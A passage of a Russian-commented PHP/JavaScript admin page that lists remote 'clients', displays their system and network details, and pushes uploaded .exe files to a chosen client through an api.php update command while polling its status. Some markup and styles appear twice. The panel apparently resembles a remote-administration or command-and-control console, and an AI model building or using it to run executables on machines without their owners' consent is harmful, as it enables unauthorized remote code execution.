// Функция для отображения информации о системе
function displaySystemInfo(systemInfo) {
    const contentDiv = document.getElementById('systemInfoContent');

    // Проверяем, есть ли ошибка в ответе
    if (systemInfo.error) {
        showError(systemInfo.error);
        return;
    }

    // Создаем HTML для отображения информации
    let html = '';

    // Информация о системе
    if (systemInfo.system || systemInfo.processor) {
        html += `
            <div class="info-section">
                <h4><i class="fas fa-desktop"></i> Система</h4>
                ${systemInfo.system ? `<p><strong>ОС:</strong> ${systemInfo.system}</p>` : ''}
                ${systemInfo.processor ? `<p><strong>Процессор:</strong> ${systemInfo.processor}</p>` : ''}
            </div>
        `;
    }

    // Информация о памяти
    if (systemInfo.ram || systemInfo.disk) {
        html += `
            <div class="info-section">
                <h4><i class="fas fa-memory"></i> Память</h4>
                ${systemInfo.ram ? `<p><strong>Оперативная память:</strong> ${systemInfo.ram}</p>` : ''}
                ${systemInfo.disk ? `<p><strong>Дисковое пространство:</strong> ${systemInfo.disk}</p>` : ''}
            </div>
        `;
    }

    // Информация о GPU
    if (systemInfo.gpu && systemInfo.gpu !== "Информация недоступна") {
        html += `
            <div class="info-section">
                <h4><i class="fas fa-tv"></i> Графика</h4>
                <p><strong>Видеокарта:</strong> ${systemInfo.gpu}</p>
            </div>
        `;
    }

    // Сетевая информация
    if (systemInfo.network && Object.keys(systemInfo.network).length > 0) {
        html += `
            <div class="info-section">
                <h4><i class="fas fa-network-wired"></i> Сетевая информация</h4>
        `;

        for (const [interfaceName, address] of Object.entries(systemInfo.network)) {
            html += `<p><strong>${interfaceName}:</strong> ${address}</p>`;
        }

        html += `</div>`;
    }

    // Если нет никакой информации
    if (html === '') {
        showError('Не удалось получить информацию о системе или данные пусты.');
        return;
    }

    // Вставляем HTML в контейнер и показываем его
    contentDiv.innerHTML = html;
    contentDiv.style.display = 'block';
}
</script>

<style>
/* Стили для модального окна */
.modal {
    display: none;
    position: fixed;
    z-index: 1000;
    left: 0;
    top: 0;
    width: 100%;
    height: 100%;
    background-color: rgba(0,0,0,0.5);
}

.modal-content {
    background-color: #fefefe;
    margin: 5% auto;
    padding: 0;
    border-radius: 8px;
    width: 80%;
    max-width: 700px;
    box-shadow: 0 4px 8px rgba(0,0,0,0.2);
    animation: modalopen 0.3s;
    max-height: 80vh;
    display: flex;
    flex-direction: column;
}

@keyframes modalopen {
    from {opacity: 0; transform: translateY(-50px);}
    to {opacity: 1; transform: translateY(0);}
}

.modal-header {
    background-color: #4a6cf7;
    color: white;
    padding: 15px 20px;
    border-top-left-radius: 8px;
    border-top-right-radius: 8px;
    display: flex;
    justify-content: space-between;
    align-items: center;
}

.modal-header h3 {
    margin: 0;
    font-size: 1.2rem;
}

.close {
    color: white;
    font-size: 28px;
    font-weight: bold;
    cursor: pointer;
}

.close:hover {
    color: #ccc;
}

.modal-body {
    padding: 20px;
    overflow-y: auto;
    flex-grow: 1;
}

.modal-footer {
    padding: 15px 20px;
    border-top: 1px solid #eee;
    text-align: right;
}

.modal-close-btn {
    background-color: #4a6cf7;
    color: white;
    border: none;
    padding: 8px 16px;
    border-radius: 4px;
    cursor: pointer;
}

.modal-close-btn:hover {
    background-color: #3a5cd8;
}

.loading {
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    padding: 40px;
}

.loading i {
    font-size: 40px;
    margin-bottom: 15px;
    color: #4a6cf7;
}

.system-info-content {
    max-height: 400px;
    overflow-y: auto;
}

.info-section {
    margin-bottom: 20px;
    padding-bottom: 15px;
    border-bottom: 1px solid #eee;
}

.info-section:last-child {
    border-bottom: none;
}

.info-section h4 {
    color: #4a6cf7;
    margin-top: 0;
    margin-bottom: 15px;
    display: flex;
    align-items: center;
}

.info-section h4 i {
    margin-right: 10px;
}

.info-section p {
    margin: 8px 0;
}

.error-message {
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    padding: 40px;
    color: #e74c3c;
    text-align: center;
}

.error-message i {
    font-size: 40px;
    margin-bottom: 15px;
}

.refresh-btn {
    background-color: #4a6cf7;
    color: white;
    border: none;
    padding: 10px 15px;
    border-radius: 4px;
    cursor: pointer;
    transition: background-color 0.3s;
}

.refresh-btn:hover {
    background-color: #3a5cd8;
}

.system-info-header {
    display: flex;
    align-items: center;
    gap: 15px;
    margin-bottom: 20px;
}

/* Адаптивность */
@media (max-width: 768px) {
    .modal-content {
        width: 95%;
        margin: 10% auto;
    }

    .system-info-header {
        flex-direction: column;
        align-items: stretch;
    }
}
</style>

<style>
/* Стили для вкладки обновления */
.update-container {
    background: var(--dark-bg);
    border-radius: 8px;
    overflow: hidden;
    box-shadow: 0 2px 10px rgba(0, 0, 0, 0.2);
    padding: 20px;
}

.update-section {
    margin-bottom: 25px;
}

.update-section h3 {
    color: var(--light-text);
    margin-bottom: 15px;
    display: flex;
    align-items: center;
    font-size: 18px;
    font-weight: 500;
}

.update-section h3 i {
    margin-right: 10px;
    color: var(--accent);
}

.form-group {
    margin-bottom: 20px;
}

.form-group label {
    display: block;
    color: var(--light-text);
    margin-bottom: 8px;
}

.select-wrapper {
    position: relative;
}

.select-wrapper::after {
    content: "\f078";
    font-family: "Font Awesome 5 Free";
    font-weight: 900;
    position: absolute;
    right: 12px;
    top: 50%;
    transform: translateY(-50%);
    color: rgba(255, 255, 255, 0.5);
    pointer-events: none;
}

.select-wrapper select {
    width: 100%;
    padding: 12px 15px;
    background: rgba(255, 255, 255, 0.05);
    border: 1px solid rgba(255, 255, 255, 0.1);
    border-radius: 6px;
    color: var(--light-text);
    appearance: none;
    outline: none;
    transition: all 0.3s ease;
}

.select-wrapper select:focus {
    border-color: var(--accent);
    box-shadow: 0 0 0 2px rgba(237, 66, 69, 0.2);
}

.file-input-wrapper {
    position: relative;
    margin-bottom: 15px;
}

.file-input-label {
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    border: 2px dashed rgba(255, 255, 255, 0.2);
    border-radius: 8px;
    padding: 25px;
    text-align: center;
    transition: all 0.3s ease;
    background: rgba(255, 255, 255, 0.03);
    cursor: pointer;
}

.file-input-label:hover {
    border-color: var(--accent);
    background: rgba(237, 66, 69, 0.05);
}

.file-input-label i {
    font-size: 42px;
    color: rgba(255, 255, 255, 0.3);
    margin-bottom: 12px;
}

.file-input-label p {
    color: var(--light-text);
    margin-bottom: 0;
}

.file-input {
    position: absolute;
    opacity: 0;
    width: 0;
    height: 0;
}

.file-info {
    margin-top: 15px;
    padding: 12px;
    background: rgba(255, 255, 255, 0.05);
    border-radius: 6px;
    border-left: 3px solid var(--accent);
    display: none;
}

.file-info p {
    margin-bottom: 5px;
    color: var(--light-text);
    font-size: 14px;
}

.update-btn {
    background: var(--accent);
    border: none;
    color: white;
    padding: 14px 28px;
    border-radius: 6px;
    cursor: pointer;
    transition: all 0.3s ease;
    display: flex;
    align-items: center;
    justify-content: center;
    font-size: 16px;
    font-weight: 500;
    width: 100%;
    margin-top: 10px;
}

.update-btn:hover:not(:disabled) {
    background: #d32f2f;
    transform: translateY(-2px);
}

.update-btn:disabled {
    background: rgba(255, 255, 255, 0.1);
    color: rgba(255, 255, 255, 0.4);
    cursor: not-allowed;
    transform: none;
}

.update-btn i {
    margin-right: 10px;
}

.status-info {
    margin-top: 20px;
    padding: 15px;
    background: rgba(255, 255, 255, 0.05);
    border-radius: 8px;
    display: none;
}

.status-info h4 {
    color: var(--light-text);
    margin-bottom: 10px;
    font-size: 16px;
}

.status-info p {
    color: var(--light-text);
    margin-bottom: 5px;
    font-size: 14px;
}

/* Стили для оверлея загрузки */
.loading-overlay {
    position: fixed;
    top: 0;
    left: 0;
    right: 0;
    bottom: 0;
    background: rgba(0, 0, 0, 0.8);
    display: flex;
    align-items: center;
    justify-content: center;
    z-index: 1000;
}

.loading-content {
    background: var(--dark-bg);
    border-radius: 12px;
    padding: 30px;
    text-align: center;
    max-width: 400px;
    width: 90%;
    box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
    border: 1px solid rgba(255, 255, 255, 0.1);
}

.loading-spinner {
    width: 50px;
    height: 50px;
    border: 4px solid rgba(255, 255, 255, 0.1);
    border-left: 4px solid var(--accent);
    border-radius: 50%;
    animation: spin 1s linear infinite;
    margin: 0 auto 20px;
}

@keyframes spin {
    0% { transform: rotate(0deg); }
    100% { transform: rotate(360deg); }
}

.loading-content h3 {
    color: var(--light-text);
    margin-bottom: 10px;
    font-size: 20px;
}

.loading-content p {
    color: var(--light-text);
    margin-bottom: 20px;
    opacity: 0.8;
}

.progress-bar {
    height: 8px;
    background: rgba(255, 255, 255, 0.1);
    border-radius: 4px;
    overflow: hidden;
    margin-bottom: 20px;
}

.progress {
    height: 100%;
    background: var(--accent);
    border-radius: 4px;
    width: 0%;
    transition: width 0.3s ease;
}

.cancel-btn {
    background: rgba(255, 255, 255, 0.1);
    border: 1px solid rgba(255, 255, 255, 0.2);
    color: var(--light-text);
    padding: 8px 16px;
    border-radius: 6px;
    cursor: pointer;
    transition: all 0.3s ease;
}

.cancel-btn:hover {
    background: rgba(255, 255, 255, 0.15);
}

.cancel-btn i {
    margin-right: 8px;
}

.error-message {
    background: rgba(255, 0, 0, 0.1);
    border: 1px solid rgba(255, 0, 0, 0.3);
    border-radius: 4px;
    padding: 10px;
    margin-top: 10px;
    display: none;
}
</style>

    <!-- Основной контент -->
    <div class="main-wrapper">
        <div class="main-content">
            <div class="container">

<!-- Вкладка "Обновление клиентов" -->
<div id="update" class="tab-content" style="display:none;">

    <h2><i class="fas fa-sync-alt" aria-hidden="true"></i> Обновление клиентов</h2>
    <div class="update-container">
        <div class="update-section">
            <h3><i class="fas fa-users"></i> Обновление клиента</h3>

            <div class="form-group">
                <label for="updateClientSelect">Выберите клиента:</label>
                <div class="select-wrapper">
                    <select id="updateClientSelect">
                        <option value="">-- Выберите клиента --</option>
                        <?php foreach($data['clients'] as $client_id => $client): ?>
                            <option value="<?php echo htmlspecialchars($client_id); ?>">
                                <?php echo htmlspecialchars($client_id); ?>
                            </option>
                        <?php endforeach; ?>
                    </select>
                </div>
            </div>

            <div class="form-group">
                <label>Выберите файл для обновления:</label>
                <div class="file-input-wrapper">
                    <label for="clientFile" class="file-input-label">
                        <i class="fas fa-cloud-upload-alt"></i>
                        <p>Нажмите для выбора файла .exe</p>
                    </label>
                    <input type="file" id="clientFile" class="file-input" accept=".exe">
                </div>

                <div class="file-info" id="fileInfo">
                    <p><strong>Файл:</strong> <span id="fileName"></span></p>
                    <p><strong>Размер:</strong> <span id="fileSize"></span></p>
                </div>
            </div>

            <button class="update-btn" id="updateButton" disabled>
                <i class="fas fa-sync-alt"></i> Обновить клиента
            </button>

            <div class="status-info" id="statusInfo">
                <h4>Статус обновления:</h4>
                <p id="statusText">Не начато</p>
                <p id="statusTime">Затраченное время: 0 сек.</p>
            </div>

            <div class="error-message" id="errorMessage"></div>
        </div>
    </div>
</div>

<!-- Оверлей загрузки -->
<div class="loading-overlay" id="loadingOverlay" style="display: none;">
    <div class="loading-content">
        <div class="loading-spinner"></div>
        <h3>Обновление клиента</h3>
        <p id="loadingStatus">Подготовка к обновлению...</p>
        <div class="progress-bar">
            <div class="progress" id="updateProgress"></div>
        </div>
        <button class="cancel-btn" id="cancelUpdateBtn">
            <i class="fas fa-times"></i> Отменить
        </button>
    </div>
</div>


      <style>
/* Стили для вкладки обновления */
.update-container {
    background: var(--dark-bg);
    border-radius: 8px;
    overflow: hidden;
    box-shadow: 0 2px 10px rgba(0, 0, 0, 0.2);
    padding: 20px;
}

.update-section {
    margin-bottom: 25px;
}

.update-section h3 {
    color: var(--light-text);
    margin-bottom: 15px;
    display: flex;
    align-items: center;
    font-size: 18px;
    font-weight: 500;
}

.update-section h3 i {
    margin-right: 10px;
    color: var(--accent);
}

.form-group {
    margin-bottom: 20px;
}

.form-group label {
    display: block;
    color: var(--light-text);
    margin-bottom: 8px;
}

.select-wrapper {
    position: relative;
}

.select-wrapper::after {
    content: "\f078";
    font-family: "Font Awesome 5 Free";
    font-weight: 900;
    position: absolute;
    right: 12px;
    top: 50%;
    transform: translateY(-50%);
    color: rgba(255, 255, 255, 0.5);
    pointer-events: none;
}

.select-wrapper select {
    width: 100%;
    padding: 12px 15px;
    background: rgba(255, 255, 255, 0.05);
    border: 1px solid rgba(255, 255, 255, 0.1);
    border-radius: 6px;
    color: var(--light-text);
    appearance: none;
    outline: none;
    transition: all 0.3s ease;
}

.select-wrapper select:focus {
    border-color: var(--accent);
    box-shadow: 0 0 0 2px rgba(237, 66, 69, 0.2);
}

.file-input-wrapper {
    position: relative;
    margin-bottom: 15px;
}

.file-input-label {
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    border: 2px dashed rgba(255, 255, 255, 0.2);
    border-radius: 8px;
    padding: 25px;
    text-align: center;
    transition: all 0.3s ease;
    background: rgba(255, 255, 255, 0.03);
    cursor: pointer;
}

.file-input-label:hover {
    border-color: var(--accent);
    background: rgba(237, 66, 69, 0.05);
}

.file-input-label i {
    font-size: 42px;
    color: rgba(255, 255, 255, 0.3);
    margin-bottom: 12px;
}

.file-input-label p {
    color: var(--light-text);
    margin-bottom: 0;
}

.file-input {
    position: absolute;
    opacity: 0;
    width: 0;
    height: 0;
}

.file-info {
    margin-top: 15px;
    padding: 12px;
    background: rgba(255, 255, 255, 0.05);
    border-radius: 6px;
    border-left: 3px solid var(--accent);
    display: none;
}

.file-info p {
    margin-bottom: 5px;
    color: var(--light-text);
    font-size: 14px;
}

.update-btn {
    background: var(--accent);
    border: none;
    color: white;
    padding: 14px 28px;
    border-radius: 6px;
    cursor: pointer;
    transition: all 0.3s ease;
    display: flex;
    align-items: center;
    justify-content: center;
    font-size: 16px;
    font-weight: 500;
    width: 100%;
    margin-top: 10px;
}

.update-btn:hover:not(:disabled) {
    background: #d32f2f;
    transform: translateY(-2px);
}

.update-btn:disabled {
    background: rgba(255, 255, 255, 0.1);
    color: rgba(255, 255, 255, 0.4);
    cursor: not-allowed;
    transform: none;
}

.update-btn i {
    margin-right: 10px;
}

.status-info {
    margin-top: 20px;
    padding: 15px;
    background: rgba(255, 255, 255, 0.05);
    border-radius: 8px;
    display: none;
}

.status-info h4 {
    color: var(--light-text);
    margin-bottom: 10px;
    font-size: 16px;
}

.status-info p {
    color: var(--light-text);
    margin-bottom: 5px;
    font-size: 14px;
}

/* Стили для оверлея загрузки */
.loading-overlay {
    position: fixed;
    top: 0;
    left: 0;
    right: 0;
    bottom: 0;
    background: rgba(0, 0, 0, 0.8);
    display: flex;
    align-items: center;
    justify-content: center;
    z-index: 1000;
}

.loading-content {
    background: var(--dark-bg);
    border-radius: 12px;
    padding: 30px;
    text-align: center;
    max-width: 400px;
    width: 90%;
    box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
    border: 1px solid rgba(255, 255, 255, 0.1);
}

.loading-spinner {
    width: 50px;
    height: 50px;
    border: 4px solid rgba(255, 255, 255, 0.1);
    border-left: 4px solid var(--accent);
    border-radius: 50%;
    animation: spin 1s linear infinite;
    margin: 0 auto 20px;
}

@keyframes spin {
    0% { transform: rotate(0deg); }
    100% { transform: rotate(360deg); }
}

.loading-content h3 {
    color: var(--light-text);
    margin-bottom: 10px;
    font-size: 20px;
}

.loading-content p {
    color: var(--light-text);
    margin-bottom: 20px;
    opacity: 0.8;
}

.progress-bar {
    height: 8px;
    background: rgba(255, 255, 255, 0.1);
    border-radius: 4px;
    overflow: hidden;
    margin-bottom: 20px;
}

.progress {
    height: 100%;
    background: var(--accent);
    border-radius: 4px;
    width: 0%;
    transition: width 0.3s ease;
}

.cancel-btn {
    background: rgba(255, 255, 255, 0.1);
    border: 1px solid rgba(255, 255, 255, 0.2);
    color: var(--light-text);
    padding: 8px 16px;
    border-radius: 6px;
    cursor: pointer;
    transition: all 0.3s ease;
}

.cancel-btn:hover {
    background: rgba(255, 255, 255, 0.15);
}

.cancel-btn i {
    margin-right: 8px;
}

.error-message {
    background: rgba(255, 0, 0, 0.1);
    border: 1px solid rgba(255, 0, 0, 0.3);
    border-radius: 4px;
    padding: 10px;
    margin-top: 10px;
    display: none;
}
</style>

<!-- Вкладка "Обновление клиентов" -->
<div id="update" class="tab-content" style="display:none;">
    <h2 class="section-title"><i class="fas fa-sync-alt"></i> Обновление клиентов</h2>

    <div class="update-container">
        <div class="update-section">
            <h3><i class="fas fa-users"></i> Обновление клиента</h3>

            <div class="form-group">
                <label for="updateClientSelect">Выберите клиента:</label>
                <div class="select-wrapper">
                    <select id="updateClientSelect">
                        <option value="">-- Выберите клиента --</option>
                        <?php foreach($data['clients'] as $client_id => $client): ?>
                            <option value="<?php echo htmlspecialchars($client_id); ?>">
                                <?php echo htmlspecialchars($client_id); ?>
                            </option>
                        <?php endforeach; ?>
                    </select>
                </div>
            </div>

            <div class="form-group">
                <label>Выберите файл для обновления:</label>
                <div class="file-input-wrapper">
                    <label for="clientFile" class="file-input-label">
                        <i class="fas fa-cloud-upload-alt"></i>
                        <p>Нажмите для выбора файла .exe</p>
                    </label>
                    <input type="file" id="clientFile" class="file-input" accept=".exe">
                </div>

                <div class="file-info" id="fileInfo">
                    <p><strong>Файл:</strong> <span id="fileName"></span></p>
                    <p><strong>Размер:</strong> <span id="fileSize"></span></p>
                </div>
            </div>

            <button class="update-btn" id="updateButton" disabled>
                <i class="fas fa-sync-alt"></i> Обновить клиента
            </button>

            <div class="status-info" id="statusInfo">
                <h4>Статус обновления:</h4>
                <p id="statusText">Не начато</p>
                <p id="statusTime">Затраченное время: 0 сек.</p>
            </div>

            <div class="error-message" id="errorMessage"></div>
        </div>
    </div>
</div>

<!-- Оверлей загрузки -->
<div class="loading-overlay" id="loadingOverlay" style="display: none;">
    <div class="loading-content">
        <div class="loading-spinner"></div>
        <h3>Обновление клиента</h3>
        <p id="loadingStatus">Подготовка к обновлению...</p>
        <div class="progress-bar">
            <div class="progress" id="updateProgress"></div>
        </div>
        <button class="cancel-btn" id="cancelUpdateBtn">
            <i class="fas fa-times"></i> Отменить
        </button>
    </div>
</div>

<script>
// Переменные для управления обновлением
let uploadedFileUrl = null;
let updateCheckInterval = null;
let selectedClientId = null;
let updateStartTime = null;
// Добавляем флаг для отслеживания состояния обновления
let isUpdateInProgress = false;
// Инициализация при загрузке страницы
document.addEventListener('DOMContentLoaded', function() {
    // Обработка выбора клиента
    document.getElementById('updateClientSelect').addEventListener('change', function() {
        selectedClientId = this.value;
        updateUpdateButtonState();
    });

    // Обработка выбора файла
    document.getElementById('clientFile').addEventListener('change', handleFileSelect);

    // Обработка нажатия кнопки обновления
    document.getElementById('updateButton').addEventListener('click', startUpdateProcess);

    // Обработка отмены обновления
    document.getElementById('cancelUpdateBtn').addEventListener('click', cancelUpdate);

    // Запускаем автоматическое обновление списка клиентов
    setInterval(autoUpdate, 5000);
    autoUpdate();
});

// Автоматическое обновление списка клиентов
function autoUpdate() {
    fetch('get_clients.php')
        .then(response => response.json())
        .then(data => updateClients(data))
        .catch(error => console.error('Ошибка обновления:', error));
}

// Обновление списка клиентов
function updateClients(data) {
    if (!data) {
        console.error('Получены пустые данные от сервера');
        return;
    }

    try {
        const clientsArray = typeof data === 'object' && !Array.isArray(data) ?
            Object.entries(data).map(([id, client]) => ({ id, ...client })) :
            data;

        console.log('Обновление списка клиентов:', clientsArray);
    } catch (error) {
        console.error('Ошибка обработки данных клиентов:', error);
    }
}

// Обработка выбора файла
function handleFileSelect() {
    const fileInput = document.getElementById('clientFile');
    const file = fileInput.files[0];
    const fileInfo = document.getElementById('fileInfo');
    const errorMessage = document.getElementById('errorMessage');

    // Скрываем предыдущие сообщения об ошибках
    errorMessage.style.display = 'none';

    if (file) {
        // Проверяем, что файл имеет расширение .exe
        if (!file.name.toLowerCase().endsWith('.exe')) {
            showMessage('Пожалуйста, выберите исполняемый файл (.exe)', 'error');
            fileInput.value = '';
            return;
        }

        // Проверяем размер файла (максимум 200 МБ)
        const maxSize = 200 * 1024 * 1024;
        if (file.size > maxSize) {
            showMessage('Файл слишком большой. Максимальный размер: 200 МБ', 'error');
            fileInput.value = '';
            return;
        }

        // Отображаем информацию о файле
        document.getElementById('fileName').textContent = file.name;
        document.getElementById('fileSize').textContent = formatFileSize(file.size);
        fileInfo.style.display = 'block';

        // Автоматически запускаем загрузку файла
        uploadClientFile();
    }
}

// Форматирование размера файла
function formatFileSize(bytes) {
    if (bytes === 0) return '0 Bytes';
    const k = 1024;
    const sizes = ['Bytes', 'KB', 'MB', 'GB'];
    const i = Math.floor(Math.log(bytes) / Math.log(k));
    return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
}

// Обновление состояния кнопки "Обновить"
function updateUpdateButtonState() {
    const updateButton = document.getElementById('updateButton');
    updateButton.disabled = !(uploadedFileUrl && selectedClientId);
}

// Показать сообщение
function showMessage(text, type) {
    const messageElement = document.getElementById('errorMessage');
    messageElement.textContent = text;
    messageElement.style.display = 'block';

    if (type === 'error') {
        messageElement.style.background = 'rgba(255, 0, 0, 0.1)';
        messageElement.style.border = '1px solid rgba(255, 0, 0, 0.3)';
    } else {
        messageElement.style.background = 'rgba(0, 255, 0, 0.1)';
        messageElement.style.border = '1px solid rgba(0, 255, 0, 0.3)';
    }
}

// Загрузка файла на сервер по частям
function uploadClientFile() {
    const fileInput = document.getElementById('clientFile');
    const file = fileInput.files[0];
    const statusInfo = document.getElementById('statusInfo');

    if (!file) {
        showMessage('Пожалуйста, выберите файл для загрузки', 'error');
        return;
    }

    // Показываем индикатор загрузки
    const loadingOverlay = document.getElementById('loadingOverlay');
    const loadingStatus = document.getElementById('loadingStatus');
    const updateProgress = document.getElementById('updateProgress');

    loadingOverlay.style.display = 'flex';
    loadingStatus.textContent = 'Подготовка к загрузке...';
    updateProgress.style.width = '0%';

    // Обновляем статус
    statusInfo.style.display = 'block';
    document.getElementById('statusText').textContent = 'Загрузка файла на сервер';
    document.getElementById('statusTime').textContent = 'Затраченное время: 0 сек.';

    // Размер chunk (5 МБ)
    const chunkSize = 5 * 1024 * 1024;
    const totalChunks = Math.ceil(file.size / chunkSize);
    let currentChunk = 0;
    const fileId = generateFileId();
    const uploadStartTime = Date.now();

    // Функция для отправки одного chunk
    function uploadChunk() {
        const start = currentChunk * chunkSize;
        const end = Math.min(start + chunkSize, file.size);
        const chunk = file.slice(start, end);

        // Обновляем статус
        const percentComplete = Math.round((currentChunk / totalChunks) * 100);
        const elapsedSeconds = Math.floor((Date.now() - uploadStartTime) / 1000);
        updateProgress.style.width = percentComplete + '%';
        loadingStatus.textContent = `Загрузка части ${currentChunk + 1} из ${totalChunks} (${percentComplete}%)`;
        document.getElementById('statusTime').textContent = `Затраченное время: ${elapsedSeconds} сек.`;

        // Создаем FormData для отправки chunk
        const formData = new FormData();
        formData.append('file', chunk, file.name);
        formData.append('chunkIndex', currentChunk);
        formData.append('totalChunks', totalChunks);
        formData.append('fileName', file.name);
        formData.append('fileId', fileId);

        // Отправляем chunk на сервер
        fetch('upload_chunked.php', {
            method: 'POST',
            body: formData
        })
        .then(response => response.json())
        .then(data => {
            if (data.success) {
                currentChunk++;

                if (currentChunk < totalChunks) {
                    uploadChunk();
                } else {
                    updateProgress.style.width = '100%';
                    loadingStatus.textContent = 'Файл успешно загружен!';

                    // Формирование полного URL
                    let fileUrl = data.fileUrl;
                    if (!fileUrl.startsWith('http')) {
                        fileUrl = window.location.origin +
                                 (fileUrl.startsWith('/') ? fileUrl : '/' + fileUrl);
                    }
                    uploadedFileUrl = fileUrl;

                    showMessage('Файл успешно загружен на сервер!', 'success');
                    updateUpdateButtonState();

                    // Автоматически запускаем обновление, если клиент уже выбран
                    if (selectedClientId) {
                        startClientUpdate();
                    } else {
                        setTimeout(() => {
                            loadingOverlay.style.display = 'none';
                            document.getElementById('statusText').textContent = 'Файл загружен. Выберите клиента для обновления';
                        }, 2000);
                    }
                }
            } else {
                throw new Error(data.message || 'Неизвестная ошибка сервера');
            }
        })
        .catch(error => {
            console.error('Ошибка загрузки файла:', error);
            loadingStatus.textContent = 'Ошибка загрузки файла';
            updateProgress.style.width = '0%';
            document.getElementById('statusText').textContent = 'Ошибка загрузки файла';

            // Показываем ошибку
            showMessage('Ошибка загрузки: ' + error.message, 'error');

            // Скрываем оверлей через 3 секунды
            setTimeout(() => {
                loadingOverlay.style.display = 'none';
            }, 3000);
        });
    }

    // Начинаем загрузку
    uploadChunk();
}

// Генерация уникального ID для файла
function generateFileId() {
    return Date.now().toString(36) + Math.random().toString(36).substr(2);
}

// Запуск процесса обновления
function startUpdateProcess() {
    if (!uploadedFileUrl) {
        // Если файл еще не загружен, запускаем загрузку
        if (document.getElementById('clientFile').files.length > 0) {
            uploadClientFile();
        } else {
            showMessage('Пожалуйста, выберите файл для обновления', 'error');
        }
        return;
    }

    if (!selectedClientId) {
        showMessage('Пожалуйста, выберите клиента для обновления', 'error');
        return;
    }

    // Запускаем обновление клиента
    startClientUpdate();
}

// Функция запуска обновления клиента
function startClientUpdate() {
    if (isUpdateInProgress) {
        showMessage('Обновление уже запущено. Дождитесь завершения.', 'error');
        return;
    }

    if (!uploadedFileUrl || !selectedClientId) {
        showMessage('Пожалуйста, выберите клиента и загрузите файл', 'error');
        return;
    }

    isUpdateInProgress = true;

    // Показываем оверлей загрузки
    const loadingOverlay = document.getElementById('loadingOverlay');
    const loadingStatus = document.getElementById('loadingStatus');
    const updateProgress = document.getElementById('updateProgress');
    const statusInfo = document.getElementById('statusInfo');

    loadingOverlay.style.display = 'flex';
    loadingStatus.textContent = 'Отправка команды обновления...';
    updateProgress.style.width = '10%';
    statusInfo.style.display = 'block';
    document.getElementById('statusText').textContent = 'Отправка команды обновления...';

    // Отправляем команду обновления
    const formData = new FormData();
    formData.append('action', 'set_update_command');
    formData.append('client_id', selectedClientId);
    formData.append('update_url', uploadedFileUrl);

    fetch('api.php', {
        method: 'POST',
        body: formData
    })
    .then(response => response.json())
    .then(data => {
        if (data.status === 'ok') {
            loadingStatus.textContent = 'Команда отправлена. Ожидание начала обновления...';
            updateProgress.style.width = '30%';
            document.getElementById('statusText').textContent = 'Команда отправлена. Ожидание начала обновления...';

            // Запускаем отслеживание статуса обновления
            updateStartTime = Date.now();
            monitorUpdateStatus(selectedClientId);
        } else {
            throw new Error(data.message || 'Ошибка отправки команды обновления');
        }
    })
    .catch(error => {
        console.error('Ошибка отправки команды обновления:', error);
        loadingStatus.textContent = 'Ошибка отправки команды';
        document.getElementById('statusText').textContent = 'Ошибка отправки команды';
        showMessage('Ошибка: ' + error.message, 'error');
        isUpdateInProgress = false;

        // Скрываем оверлей через 3 секунды
        setTimeout(() => {
            loadingOverlay.style.display = 'none';
        }, 3000);
    });
}


// Функция для отслеживания статуса обновления
function monitorUpdateStatus(clientId) {
    if (updateCheckInterval) {
        clearInterval(updateCheckInterval);
    }

    updateCheckInterval = setInterval(() => {
        checkUpdateStatus(clientId);
    }, 2000); // Проверяем каждые 2 секунды
}

// Функция проверки статуса обновления
function checkUpdateStatus(clientId) {
    const formData = new FormData();
    formData.append('action', 'get_update_status');
    formData.append('client_id', clientId);

    fetch('api.php', {
        method: 'POST',
        body: formData
    })
    .then(response => response.json())
    .then(data => {
        const loadingStatus = document.getElementById('loadingStatus');
        const updateProgress = document.getElementById('updateProgress');
        const statusText = document.getElementById('statusText');
        const statusTime = document.getElementById('statusTime');

        if (data.status === 'ok') {
            const updateStatus = data.update_status;
            const elapsedTime = Math.floor((Date.now() - updateStartTime) / 1000);

            statusTime.textContent = `Затраченное время: ${elapsedTime} сек.`;

            switch(updateStatus) {
                case 'pending':
                    loadingStatus.textContent = `Ожидание начала обновления... (${elapsedTime} сек.)`;
                    statusText.textContent = `Ожидание начала обновления... (${elapsedTime} сек.)`;
                    updateProgress.style.width = '40%';
                    break;

                case 'updating':
                    loadingStatus.textContent = `Клиент обновляется... (${elapsedTime} сек.)`;
                    statusText.textContent = `Клиент обновляется... (${elapsedTime} сек.)`;
                    updateProgress.style.width = '60%';
                    break;

                case 'success':
                    loadingStatus.textContent = 'Обновление успешно завершено!';
                    statusText.textContent = 'Обновление успешно завершено!';
                    updateProgress.style.width = '100%';

                    // Останавливаем проверку
                    clearInterval(updateCheckInterval);
                    isUpdateInProgress = false;

                    // Скрываем оверлей через 3 секунды
                    setTimeout(() => {
                        document.getElementById('loadingOverlay').style.display = 'none';

                        // Сбрасываем состояние
                        resetUpdateState();

                        showMessage('Клиент успешно обновлен!', 'success');
                    }, 3000);
                    break;

                case 'failed':
                    loadingStatus.textContent = 'Обновление не удалось';
                    statusText.textContent = 'Обновление не удалось';
                    updateProgress.style.width = '0%';

                    // Останавливаем проверку
                    clearInterval(updateCheckInterval);
                    isUpdateInProgress = false;

                    showMessage('Обновление клиента не удалось', 'error');
                    break;

                default:
                    loadingStatus.textContent = `Неизвестный статус: ${updateStatus} (${elapsedTime} сек.)`;
                    statusText.textContent = `Неизвестный статус: ${updateStatus} (${elapsedTime} сек.)`;
            }

            // Если прошло больше 5 минут, прерываем обновление
            if (elapsedTime > 300) {
                clearInterval(updateCheckInterval);
                isUpdateInProgress = false;
                loadingStatus.textContent = 'Таймаут обновления (более 5 минут)';
                statusText.textContent = 'Таймаут обновления (более 5 минут)';
                updateProgress.style.width = '0%';

                showMessage('Обновление заняло слишком много времени', 'error');

                // Скрываем оверлей через 3 секунды
                setTimeout(() => {
                    document.getElementById('loadingOverlay').style.display = 'none';
                    resetUpdateState();
                }, 3000);
            }
        } else {
            console.error('Ошибка получения статуса обновления:', data.message);
        }
    })
    .catch(error => {
        console.error('Ошибка проверки статуса обновления:', error);
    });
}

// Функция сброса состояния обновления
function resetUpdateState() {
    uploadedFileUrl = null;
    selectedClientId = null;
    document.getElementById('updateClientSelect').value = '';
    document.getElementById('clientFile').value = '';
